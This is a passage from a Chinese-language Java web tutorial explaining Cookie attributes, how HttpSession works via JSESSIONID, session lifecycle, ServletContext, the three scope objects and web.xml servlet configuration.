class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="1-4-Cookie-的属性"><a href="#1-4-Cookie-的属性" class="headerlink" title="1.4 Cookie 的属性"></a>1.4 Cookie 的属性</h3><p>除了基本的 name 和 value，还可以设置 Cookie 的其他属性来控制其行为。</p>
<ul>
<li><code>void setMaxAge(int seconds)</code>: <strong>设置 Cookie 的有效期</strong><ul>
<li><strong>正数:</strong> 表示 Cookie 的存活秒数。Cookie 会被保存在客户端的硬盘上，浏览器关闭后依然有效。</li>
<li><strong>负数 (默认值):</strong> 表示 Cookie 仅在当前浏览器会话期间有效。Cookie 存储在浏览器内存中，一旦浏览器关闭，Cookie 就会被删除。</li>
<li><strong>零 (0):</strong> 表示<strong>立即删除</strong>该 Cookie。这是服务器端删除客户端 Cookie 的标准方法。</li>
</ul>
</li>
<li><code>void setPath(String uri)</code>: <strong>设置 Cookie 的有效路径</strong><ul>
<li>指定一个 URL 路径，只有当请求的路径是该路径或其子路径时，浏览器才会发送这个 Cookie。</li>
<li><strong>常用设置:</strong> <code>cookie.setPath(&quot;/&quot;);</code> 或 <code>cookie.setPath(request.getContextPath());</code>，使其对整个 Web 应用都有效。</li>
</ul>
</li>
<li><code>void setDomain(String pattern)</code>: <strong>设置 Cookie 的有效域名</strong><ul>
<li>用于跨子域共享 Cookie。例如，设置为 <code>.example.com</code>，则 <code>a.example.com</code> 和 <code>b.example.com</code> 都可以访问该 Cookie。</li>
</ul>
</li>
<li><code>void setHttpOnly(boolean isHttpOnly)</code>: <strong>（安全相关）</strong><ul>
<li>如果设置为 <code>true</code>，则该 Cookie <strong>不能被客户端的 JavaScript 脚本访问</strong>（通过 <code>document.cookie</code>）。这能有效防止<strong>跨站脚本攻击 (XSS)</strong> 窃取 Cookie。</li>
</ul>
</li>
<li><code>void setSecure(boolean flag)</code>: <strong>（安全相关）</strong><ul>
<li>如果 设置为 <code>true</code>，则该 Cookie <strong>只会在 HTTPS 连接中被发送</strong>，在普通的 HTTP 连接中不会被发送，可以防止在传输过程中被窃听。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-5-优缺点及应用场景"><a href="#1-5-优缺点及应用场景" class="headerlink" title="1.5 优缺点及应用场景"></a>1.5 优缺点及应用场景</h3><h4 id="1-5-1-优点"><a href="#1-5-1-优点" class="headerlink" title="1.5.1 优点:"></a>1.5.1 优点:</h4><ul>
<li><strong>API 简单：</strong> 使用起来非常方便。</li>
<li><strong>减轻服务器压力：</strong> 数据存储在客户端，不占用服务器内存。</li>
<li><strong>可持久化：</strong> 通过设置 <code>setMaxAge</code> 可以实现长时间保持状态。</li>
</ul>
<hr>
<h4 id="1-5-2-缺点"><a href="#1-5-2-缺点" class="headerlink" title="1.5.2 缺点"></a>1.5.2 缺点</h4><ul>
<li><strong>大小和数量限制：</strong> 大多数浏览器限制单个 Cookie 大小为 4KB 左右，每个域名下的 Cookie 数量也有限制（通常为 20-50 个）。</li>
<li><strong>安全性差：</strong> Cookie 以明文形式存储在客户端本地，并且在网络中明文传输，容易被窃取和篡改。<strong>绝对不能用 Cookie 存储敏感信息</strong>（如密码、银行卡号）。</li>
<li><strong>增加网络流量：</strong> 浏览器每次请求都会携带相关 Cookie，即使是请求图片、CSS 等静态资源，也会带上，造成不必要的流量浪费。</li>
<li><strong>用户可禁用：</strong> 用户可以在浏览器设置中禁用 Cookie，导致依赖 Cookie 的功能失效。</li>
</ul>
<hr>
<h4 id="1-5-3-应用场景"><a href="#1-5-3-应用场景" class="headerlink" title="1.5.3 应用场景"></a>1.5.3 应用场景</h4><ul>
<li><strong>“记住我”功能：</strong> 记录一个非敏感的、加密的用户令牌，用于下次访问时自动登录。</li>
<li><strong>购物车（早期实现）：</strong> 将商品 ID 存储在 Cookie 中，但现在更多使用 Session。</li>
<li><strong>个性化设置：</strong> 记录用户的偏好，如网站主题（白天&#x2F;夜间模式）、语言选择等。</li>
<li><strong>广告追踪：</strong> 跟踪用户在不同网站间的浏览行为，以推送相关广告。</li>
</ul>
<hr>
<h2 id="2-Session-HttpSession"><a href="#2-Session-HttpSession" class="headerlink" title="2. Session (HttpSession)"></a>2. Session (HttpSession)</h2><h3 id="2-1-定义"><a href="#2-1-定义" class="headerlink" title="2.1 定义"></a>2.1 定义</h3><p><strong>Session (会话)</strong> 是一种<strong>服务器端</strong>的会话跟踪技术。它在服务器的内存中为每个独立的用户（客户端）开辟一块专属的存储空间，用于在多次请求之间保存和共享该用户的状态数据。</p>
<p>HTTP 协议是无状态的，服务器本身无法区分连续的两次请求是否来自同一个用户。Session 机制就是为了解决这个问题而诞生的。</p>
<p><code>HttpSession</code> 是 Servlet API 提供的用于表示 Session 的接口。</p>
<hr>
<h3 id="2-2-工作原理"><a href="#2-2-工作原理" class="headerlink" title="2.2 工作原理"></a>2.2 工作原理</h3><p>Session 的实现通常<strong>依赖于 Cookie</strong>。具体来说，它依赖一个名为 <code>JSESSIONID</code> 的特殊 Cookie。</p>
<pre><code class="highlight mermaid">sequenceDiagram
    title Java Session (JSESSIONID) 工作原理
    autonumber

    %% == 第一次交互: 创建 Session == %%

    %% 1. 第一次请求 (无 JSESSIONID) %%
    Client-&gt;&gt;Server: 发起请求 (GET /some-resource)
    note right of Client: 请求头中没有 JSESSIONID Cookie

    %% 2 &amp; 3. 服务器创建 Session 并响应 %%
    activate Server
    note over Server: 调用 request.getSession()
    note over Server: 发现无 Session ID, 执行:&lt;br/&gt;1. 创建 HttpSession 对象&lt;br/&gt;2. 生成唯一 Session ID (e.g., A5D7...)&lt;br/&gt;3. 存入内存 Map (ID -&gt; Session)
    Server--&gt;&gt;Client: 返回响应 (200 OK)
    note left of Server: 响应头包含 Set-Cookie: JSESSIONID=A5D7...
    deactivate Server
    note right of Client: 浏览器在内存中保存 JSESSIONID Cookie

    %% == 分隔符: 表示后续操作 == %%
    rect rgb(230, 240, 255)
        note over Client, Server: 后续... 用户在同一会话中继续操作
    end

    %% == 后续交互: 识别 Session == %%

    %% 4. 后续请求 (携带 JSESSIONID) %%
    Client-&gt;&gt;Server: 发起后续请求 (GET /user/profile)
    note right of Client: 请求头自动携带 Cookie: JSESSIONID=A5D7...

    %% 5. 服务器识别 Session %%
    activate Server
    note over Server: 1. 从 Cookie 读取 Session ID&lt;br/&gt;2. 在内存 Map 中查找对应的 HttpSession&lt;br/&gt;3. 成功找到, 关联到当前请求
    Server--&gt;&gt;Client: 返回与会话相关的响应 (如用户数据)
    deactivate Server
    note right of Client: 用户状态得以保持</code></pre>

<p><strong>流程图解:</strong></p>
<ol>
<li><strong>第一次请求 (客户端 -&gt; 服务器):</strong><ul>
<li>客户端浏览器向服务器发起请求。此时，请求中没有 <code>JSESSIONID</code> Cookie。</li>
</ul>
</li>
<li><strong>服务器创建 Session:</strong><ul>
<li>服务器端的 Servlet 调用 <code>request.getSession()</code> 方法。</li>
<li>容器发现当前请求没有携带有效的 Session ID，于是执行以下操作：<ul>
<li>在服务器内存中创建一个全新的 <code>HttpSession</code> 对象。</li>
<li>生成一个<strong>全局唯一的、随机的字符串</strong>作为 <strong>Session ID</strong> (例如: <code>A5D7F9G2H4J1K8L3</code>)。</li>
<li>将这个 <code>HttpSession</code> 对象和它的 Session ID 以键值对的形式存入一个全局的 Map 中。</li>
</ul>
</li>
</ul>
</li>
<li><strong>服务器响应:</strong><ul>
<li>服务器在返回给客户端的 HTTP <strong>响应头</strong>中，添加一个 <code>Set-Cookie</code> 字段，将 Session ID 发送回去。</li>
<li>例如：<code>Set-Cookie: JSESSIONID=A5D7F9G2H4J1K8L3; Path=/myapp</code></li>
<li>这个 Cookie 默认是<strong>会话级别</strong>的（<code>Max-Age</code> 为负数），意味着它存储在浏览器内存中，浏览器关闭后即失效。</li>
</ul>
</li>
<li><strong>后续请求 (客户端 -&gt; 服务器):</strong><ul>
<li>当浏览器再次向该服务器发起请求时，它会自动在 HTTP <strong>请求头</strong>中带上之前收到的 <code>JSESSIONID</code> Cookie。</li>
<li>例如：<code>Cookie: JSESSIONID=A5D7F9G2H4J1K8L3</code></li>
</ul>
</li>
<li><strong>服务器识别 Session:</strong><ul>
<li>服务器接收到请求，从 Cookie 中读取到 Session ID。</li>
<li>容器使用这个 ID 在内存的全局 Map 中查找对应的 <code>HttpSession</code> 对象。</li>
<li>如果找到了，就将这个已存在的 Session 对象与当前请求关联起来，后续的 <code>setAttribute</code> &#x2F; <code>getAttribute</code> 操作都是针对这个找到的对象。</li>
<li>这样，服务器就成功地识别了用户，并恢复了该用户的会话状态。</li>
</ul>
</li>
</ol>
<p><strong>如果客户端禁用了 Cookie 怎么办？</strong></p>
<p>作为备用方案，服务器可以使用 <strong>URL 重写 (URL Rewriting)</strong>。它会动态地将 Session ID 附加在所有页面链接的末尾，例如 <code>.../page.jsp;jsessionid=A5D7F9...</code>。这种方式不推荐，因为它不安全且会破坏 URL 的美观性。</p>
<hr>
<h3 id="2-3-Session-API"><a href="#2-3-Session-API" class="headerlink" title="2.3 Session API"></a>2.3 Session API</h3><p>主要通过 <code>request</code> 对象获取 <code>HttpSession</code> 对象，然后通过 <code>HttpSession</code> 对象进行操作。</p>
<ol>
<li><strong>获取&#x2F;创建 Session 对象:</strong><ul>
<li><code>HttpSession session = request.getSession();</code> (等同于 <code>request.getSession(true);</code>)<ul>
<li>这是<strong>最常用</strong>的方法。它的逻辑是：检查请求中是否有合法的 Session ID，如果有，则返回对应的 Session 对象；如果没有，则<strong>立即创建一个新的</strong> Session 对象并返回。</li>
</ul>
</li>
<li><code>HttpSession session = request.getSession(false);</code><ul>
<li>逻辑是：检查请求中是否有合法的 Session ID，如果有，则返回对应的 Session 对象；如果没有，<strong>不创建新的 Session</strong>，而是返回 <code>null</code>。</li>
<li>此方法常用于<strong>判断用户是否已登录</strong>。</li>
</ul>
</li>
</ul>
</li>
<li><strong>在 Session 中存取数据 (作为域对象):</strong><ul>
<li><code>void session.setAttribute(String name, Object value);</code><ul>
<li>将一个 Java 对象存入 Session。可以存储<strong>任何类型</strong>的对象，而不仅限于字符串。</li>
</ul>
</li>
<li><code>Object session.getAttribute(String name);</code><ul>
<li>根据名称从 Session 中获取对象。返回的是 <code>Object</code> 类型，需要进行强制类型转换。</li>
</ul>
</li>
<li><code>void session.removeAttribute(String name);</code><ul>
<li>从 Session 中移除指定的属性。</li>
</ul>
</li>
</ul>
</li>
<li><strong>管理 Session:</strong><ul>
<li><code>void session.invalidate();</code><ul>
<li><strong>使 Session 立即失效</strong>。这会清空 Session 中所有数据，并解除与客户端的绑定。这是实现**“用户注销”**功能的核心方法。</li>
</ul>
</li>
<li><code>String session.getId();</code><ul>
<li>获取 Session 的唯一 ID 字符串。</li>
</ul>
</li>
<li><code>void session.setMaxInactiveInterval(int seconds);</code><ul>
<li>设置 Session 的最大非活动时间（即超时时间），单位为秒。覆盖 <code>web.xml</code> 中的默认配置。</li>
</ul>
</li>
<li><code>int session.getMaxInactiveInterval();</code><ul>
<li>获取 Session 的超时时间。</li>
</ul>
</li>
<li><code>long session.getCreationTime();</code><ul>
<li>获取 Session 的创建时间（毫秒级时间戳）。</li>
</ul>
</li>
<li><code>boolean session.isNew();</code><ul>
<li>判断当前 Session 是否是新创建的（即客户端还不知道它的存在，ID 还未通过响应发送回去）。</li>
</ul>
</li>
</ul>
</li>
</ol>
<hr>
<h3 id="2-4-Session-的生命周期"><a href="#2-4-Session-的生命周期" class="headerlink" title="2.4 Session 的生命周期"></a>2.4 Session 的生命周期</h3><ol>
<li><p><strong>创建 (Creation):</strong></p>
<ul>
<li>当客户端第一次访问服务器，并且代码中调用了 <code>request.getSession(true)</code> 或 <code>request.getSession()</code> 时，Session 对象被创建。</li>
</ul>
</li>
<li><p><strong>活动 (Active):</strong></p>
<ul>
<li>在 Session 的超时时间 (<code>maxInactiveInterval</code>) 内，只要客户端持续与服务器进行交互，Session 就一直处于活动状态。</li>
<li><strong>每次有效的客户端请求都会重置 Session 的计时器</strong>。例如，超时时间为 30 分钟，用户在第 29 分钟时访问了新页面，那么 Session 的生命周期会从此刻起重新再计算 30 分钟。</li>
</ul>
</li>
<li><p><strong>销毁 (Destruction):</strong><br>Session 在以下三种情况下会被销毁：</p>
<ul>
<li><p><strong>超时 (Timeout):</strong> 用户在指定的时间内（默认通常是 30 分钟，可在 <code>web.xml</code> 中配置）没有任何操作，服务器会自动销毁该 Session 以释放内存。这是最常见的销毁方式。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在 web.xml 中配置全局 session 超时时间为 30 分钟 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>30<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>手动销毁 (Invalidation):</strong> 在代码中明确调用 <code>session.invalidate()</code> 方法，Session 会立即被销毁。常用于用户退出登录功能。</p>
</li>
<li><p><strong>服务器关闭 (Shutdown):</strong> 当 Web 服务器或应用正常关闭时，所有存在的 Session 都会被销毁。</p>
</li>
</ul>
</li>
</ol>
<hr>
<h3 id="2-5-Cookie-与-Session-的区别与联系"><a href="#2-5-Cookie-与-Session-的区别与联系" class="headerlink" title="2.5 Cookie 与 Session 的区别与联系"></a>2.5 Cookie 与 Session 的区别与联系</h3><table>
<thead>
<tr>
<th>特性</th>
<th><strong>Cookie</strong></th>
<th><strong>Session</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>数据存储位置</strong></td>
<td><strong>客户端 (浏览器)</strong></td>
<td><strong>服务器端 (内存中)</strong></td>
</tr>
<tr>
<td><strong>安全性</strong></td>
<td><strong>低</strong>。数据暴露在客户端，易被窃取和篡改。</td>
<td><strong>高</strong>。数据存储在服务器，客户端只能接触到无意义的 Session ID。</td>
</tr>
<tr>
<td><strong>存储数据类型</strong></td>
<td><strong>String (字符串)</strong>，且不能包含特殊字符。</td>
<td><strong>Object (任何 Java 对象)</strong>。</td>
</tr>
<tr>
<td><strong>存储数据大小</strong></td>
<td><strong>小</strong>，单个 Cookie 约 4KB，数量也有限制。</td>
<td><strong>理论上无限制</strong>，但受限于服务器的内存大小。</td>
</tr>
<tr>
<td><strong>对服务器压力</strong></td>
<td><strong>无</strong>，不占用服务器资源。</td>
<td><strong>有</strong>，每个用户的 Session 都会占用服务器的内存资源。</td>
</tr>
<tr>
<td><strong>生命周期</strong></td>
<td>可通过 <code>setMaxAge</code> 设置为长久有效（存硬盘），或会话级别（存内存）。</td>
<td>通常是会话级别，或由服务器超时策略决定。</td>
</tr>
<tr>
<td><strong>联系</strong></td>
<td><strong>Session 依赖 Cookie</strong> 来实现。服务器通过 <code>JSESSIONID</code> Cookie 来识别客户端对应的 Session。</td>
<td>Session 机制的实现通常需要 Cookie 的支持。</td>
</tr>
</tbody></table>
<hr>
<h1 id="四、Servlet-上下文与配置"><a href="#四、Servlet-上下文与配置" class="headerlink" title="四、Servlet 上下文与配置"></a>四、Servlet 上下文与配置</h1><h2 id="1-ServletContext-应用上下文"><a href="#1-ServletContext-应用上下文" class="headerlink" title="1. ServletContext (应用上下文)"></a>1. ServletContext (应用上下文)</h2><h3 id="1-1-定义-2"><a href="#1-1-定义-2" class="headerlink" title="1.1 定义"></a>1.1 定义</h3><p><strong><code>ServletContext</code></strong> 是一个<strong>全局性的接口</strong>，它代表了<strong>整个 Web 应用</strong>本身。</p>
<p>当 Servlet 容器（如 Tomcat）启动一个 Web 应用时，它会为这个应用创建一个<strong>唯一</strong>的 <code>ServletContext</code> 实例。这个实例在 Web 应用被加载时创建，在 Web 应用被移除或服务器关闭时销毁。</p>
<p><strong>核心特性：</strong></p>
<ul>
<li><strong>唯一性：</strong> 每个 Web 应用（每个 <code>.war</code> 文件）只有一个 <code>ServletContext</code> 实例。</li>
<li><strong>全局性：</strong> 该实例被应用内的所有 Servlet、Filter 和 Listener 共享。</li>
<li><strong>生命周期：</strong> 与 Web 应用的生命周期相同。</li>
</ul>
<p>它提供了一种让应用中的不同组件（如多个 Servlet）相互通信和共享数据的方式。</p>
<hr>
<h3 id="1-2-获取方式"><a href="#1-2-获取方式" class="headerlink" title="1.2 获取方式"></a>1.2 获取方式</h3><ol>
<li><p><strong>在 Servlet 中获取：</strong></p>
<ul>
<li><p><strong>通过 <code>GenericServlet</code> 继承的方法（最常用）：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>通过 <code>ServletConfig</code> 对象获取（通常在 <code>init</code> 方法中）：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> config.getServletContext();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>通过 <code>HttpServletRequest</code> 对象获取：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> request.getServletContext();</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>通过 <code>HttpSession</code> 对象获取：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> session.getServletContext();</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在 Listener 中获取：</strong></p>
<ul>
<li>在实现了 <code>ServletContextListener</code> 的监听器中，可以直接通过事件对象获取：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent sce)</span> &#123;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> sce.getServletContext();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="1-3-作用"><a href="#1-3-作用" class="headerlink" title="1.3 作用"></a>1.3 作用</h3><ol>
<li><p><strong>作为域对象，实现全局数据共享 (Application Scope):</strong></p>
<ul>
<li><code>ServletContext</code> 是三大作用域中范围最大的一个。存储在其中的数据，整个应用中的所有用户、所有请求都可以访问。</li>
<li><strong>API:</strong><ul>
<li><code>void setAttribute(String name, Object value)</code></li>
<li><code>Object getAttribute(String name)</code></li>
<li><code>void removeAttribute(String name)</code></li>
</ul>
</li>
<li><strong>典型应用场景：</strong><ul>
<li><strong>网站访问计数器：</strong> 可以在 <code>ServletContext</code> 中存放一个计数器，每次请求都对其加一。</li>
<li><strong>Web 应用的全局配置信息：</strong> 例如，数据库连接池对象、Spring 框架的 ApplicationContext 容器等重量级对象，通常会存储在 <code>ServletContext</code> 中，避免重复创建。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>获取全局初始化参数 (<code>&lt;context-param&gt;</code>):</strong></p>
<ul>
<li><p>可以在 <code>web.xml</code> 中配置对整个应用都有效的初始化参数，这些参数通过 <code>ServletContext</code> 来读取。</p>
</li>
<li><p><strong>web.xml 配置:</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>appVersion<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>1.2.0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Java 代码读取:</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">version</span> <span class="operator">=</span> context.getInitParameter(<span class="string">&quot;appVersion&quot;</span>); <span class="comment">// 返回 &quot;1.2.0&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>这与 <code>ServletConfig</code> 的初始化参数不同，<code>ServletConfig</code> 的参数仅对单个 Servlet 有效。</p>
</li>
</ul>
</li>
<li><p><strong>获取 Web 应用中的资源:</strong></p>
<ul>
<li><p>这是 <code>ServletContext</code> 非常重要的一个功能，它允许你在不知道项目部署在服务器哪个物理位置的情况下，安全地访问项目内部的资源文件。</p>
</li>
<li><p><strong><code>InputStream getResourceAsStream(String path)</code> (推荐使用):</strong></p>
<ul>
<li>以输入流的形式返回指定路径的资源。路径必须以 <code>/</code> 开头，代表应用的根目录。</li>
<li>这是读取 <code>/WEB-INF/</code> 目录下资源（如配置文件 <code>config.properties</code>）的<strong>标准且最可靠</strong>的方式。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取 /WEB-INF/classes/db.properties 文件</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> context.getResourceAsStream(<span class="string">&quot;/WEB-INF/classes/db.properties&quot;</span>);</span><br><span class="line"><span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">props.load(in);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>String getRealPath(String path)</code> (谨慎使用):</strong></p>
<ul>
<li>将一个 Web 应用的相对路径转换为服务器上的<strong>绝对物理磁盘路径</strong>。</li>
<li><strong>缺点：</strong> 如果应用是以 <code>.war</code> 包形式直接运行而没有解压，或者在某些安全限制较高的环境中，此方法可能返回 <code>null</code> 或无法正常工作。因此，<code>getResourceAsStream</code> 是更佳选择。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可能返回 D:\apache-tomcat\webapps\myapp\images\logo.png</span></span><br><span class="line"><span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> context.getRealPath(<span class="string">&quot;/images/logo.png&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>记录日志:</strong></p>
<ul>
<li><code>void log(String message)</code></li>
<li>可以将日志信息写入到 Servlet 容器的日志文件中（例如 Tomcat 的 <code>logs</code> 目录下的日志），方便进行调试和问题排查。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="2-三大作用域对象总结"><a href="#2-三大作用域对象总结" class="headerlink" title="2. 三大作用域对象总结"></a>2. 三大作用域对象总结</h2><h3 id="2-1-HttpServletRequest-request-scope"><a href="#2-1-HttpServletRequest-request-scope" class="headerlink" title="2.1 HttpServletRequest (request scope)"></a>2.1 <code>HttpServletRequest</code> (request scope)</h3><ul>
<li><strong>作用域名称：</strong> 请求域 (Request Scope)</li>
<li><strong>生命周期：</strong><ul>
<li><strong>开始：</strong> 当客户端发起一次 HTTP 请求到达服务器时创建。</li>
<li><strong>结束：</strong> 当服务器对该请求的响应完成并发送回客户端时销毁。</li>
<li>它是<strong>生命周期最短</strong>的作用域。</li>
</ul>
</li>
<li><strong>数据共享范围：</strong><ul>
<li>仅在<strong>同一次请求</strong>的处理过程中有效。</li>
<li>数据可以在通过<strong>请求转发 (<code>forward</code>)</strong> 跳转的多个 Servlet 和 JSP 之间共享。</li>
<li>一旦请求结束（例如，通过重定向 <code>redirect</code> 或用户点击新链接），<code>request</code> 对象及其中的数据就会被销毁。</li>
</ul>
</li>
<li><strong>典型应用场景：</strong><ul>
<li><strong>MVC 模式中的数据传递：</strong> Servlet (Controller) 处理完业务逻辑，将需要展示给用户的数据（如一个 <code>User</code> 对象或一个 <code>List</code> 集合）存入 <code>request</code> 域，然后<strong>转发</strong>到 JSP (View) 页面进行渲染。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-2-HttpSession-session-scope"><a href="#2-2-HttpSession-session-scope" class="headerlink" title="2.2 HttpSession (session scope)"></a>2.2 <code>HttpSession</code> (session scope)</h3><ul>
<li><strong>作用域名称：</strong> 会话域 (Session Scope)</li>
<li><strong>生命周期：</strong><ul>
<li><strong>开始：</strong> 当一个用户（浏览器）首次访问应用，并且代码调用 <code>request.getSession()</code> 时创建。</li>
<li><strong>结束：</strong> 以下三种情况之一发生时销毁：<ol>
<li>会话超时（用户长时间无操作）。</li>
<li>开发者手动调用 <code>session.invalidate()</code> 方法。</li>
<li>服务器关闭或 Web 应用被卸载。</li>
</ol>
</li>
</ul>
</li>
<li><strong>数据共享范围：</strong><ul>
<li>在<strong>同一个用户（浏览器）的多次请求之间</strong>有效。</li>
<li>数据对于当前用户是私有的，其他用户无法访问。</li>
</ul>
</li>
<li><strong>典型应用场景：</strong><ul>
<li><strong>跟踪用户状态：</strong><ul>
<li><strong>用户登录：</strong> 存储用户的登录信息，判断用户是否已登录。</li>
<li><strong>购物车：</strong> 存储用户添加到购物车中的商品列表。</li>
<li><strong>在线表单：</strong> 在多步骤的表单提交中，临时保存用户已填写的信息。</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-3-ServletContext-application-scope"><a href="#2-3-ServletContext-application-scope" class="headerlink" title="2.3 ServletContext (application scope)"></a>2.3 <code>ServletContext</code> (application scope)</h3><ul>
<li><strong>作用域名称：</strong> 应用域 &#x2F; 上下文域 (Application Scope)</li>
<li><strong>生命周期：</strong><ul>
<li><strong>开始：</strong> 当 Web 应用在服务器上被加载（启动）时创建。</li>
<li><strong>结束：</strong> 当 Web 应用被卸载或服务器关闭时销毁。</li>
<li>它是<strong>生命周期最长</strong>的作用域，与 Web 应用共存亡。</li>
</ul>
</li>
<li><strong>数据共享范围：</strong><ul>
<li>在<strong>整个 Web 应用的所有用户、所有请求之间</strong>共享。</li>
<li>它是全局的，任何一个用户存入的数据，其他所有用户都能访问到。</li>
</ul>
</li>
<li><strong>典型应用场景：</strong><ul>
<li><strong>存储全局性、共享性的资源：</strong><ul>
<li><strong>网站访问量计数器。</strong></li>
<li><strong>数据库连接池</strong>、<strong>Spring IoC 容器</strong>等重量级对象，只需创建一次，供整个应用使用。</li>
<li><strong>应用范围的配置信息</strong>，如从 <code>web.xml</code> 中读取的 <code>&lt;context-param&gt;</code>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="3-Servlet-配置"><a href="#3-Servlet-配置" class="headerlink" title="3. Servlet 配置"></a>3. Servlet 配置</h2><h3 id="3-1-传统方式：web-xml-部署描述符"><a href="#3-1-传统方式：web-xml-部署描述符" class="headerlink" title="3.1 传统方式：web.xml (部署描述符)"></a>3.1 传统方式：<code>web.xml</code> (部署描述符)</h3><p>在 Servlet 3.0 规范之前，<strong><code>web.xml</code> 文件是唯一</strong>的配置方式。这个文件位于 Web 应用的 <code>WEB-INF</code> 目录下，是整个应用的部署描述符 。</p>
<p>配置一个 Servlet 通常需要两个核心标签：<code>&lt;servlet&gt;</code> 和 <code>&lt;servlet-mapping&gt;</code>。</p>
<ol>
<li><strong><code>&lt;servlet&gt;</code> 标签：声明一个 Servlet</strong><ul>
<li><strong>作用：</strong> 向容器注册一个 Servlet，给它起一个内部使用的逻辑名称，并指定它的完整类路径。</li>
<li><strong>子标签：</strong><ul>
<li><code>&lt;servlet-name&gt;</code>: 为 Servlet 指定一个唯一的、自定义的名称。这个名称在 <code>web.xml</code> 内部用作引用。</li>
<li><code>&lt;servlet-class&gt;</code>: 指定该 Servlet 的<strong>完整类名</strong>（包名 + 类名）。</li>
<li><code>&lt;init-param&gt;</code>: (可选) 为该 Servlet 配置初始化参数。</li>
<li><code>&lt;load-on-startup&gt;</code>: (可选) 配置 Servlet 的加载时机。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>&lt;servlet-mapping&gt;</code> 标签：映射 Servlet 的访问路径</strong><ul>
<li><strong>作用：</strong> 将一个已声明的 Servlet 与一个或多个 URL 模式关联起来。</li>
<li><strong>子标签：</strong><ul>
<li><code>&lt;servlet-name&gt;</code>: 必须与 <code>&lt;servlet&gt;</code> 标签中定义的某个 <code>&lt;servlet-name&gt;</code> <strong>完全匹配</strong>，以此建立关联。</li>
<li><code>&lt;url-pattern&gt;</code>: 定义客户端可以通过哪个 URL 路径来访问这个 Servlet。</li>
</ul>
</li>
</ul>
</li>
</ol>
